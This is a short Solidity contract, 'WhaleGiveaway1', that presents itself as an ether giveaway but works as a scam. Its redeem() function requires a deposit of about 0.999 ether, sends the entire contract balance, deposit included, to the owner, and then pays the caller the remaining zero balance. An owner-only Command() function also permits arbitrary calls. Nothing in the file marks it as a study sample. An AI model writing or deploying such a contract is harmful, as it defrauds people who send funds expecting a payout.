pragma solidity ^0.8.0;

contract WhaleGiveaway1 {
    address payable public Owner;
    uint public constant minEligibility = 0.999001 ether;

    constructor() {
        Owner = payable(msg.sender);
    }

    receive() external payable {}

    function redeem() public payable {
        require(msg.value >= minEligibility, "Minimum eligibility not met.");
        Owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() public payable {
        require(msg.sender == Owner, "Only owner can withdraw.");
        Owner.transfer(address(this).balance);
    }

    function Command(address payable adr, bytes memory data) public payable {
        require(msg.sender == Owner, "Only owner can execute commands.");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed.");
    }
}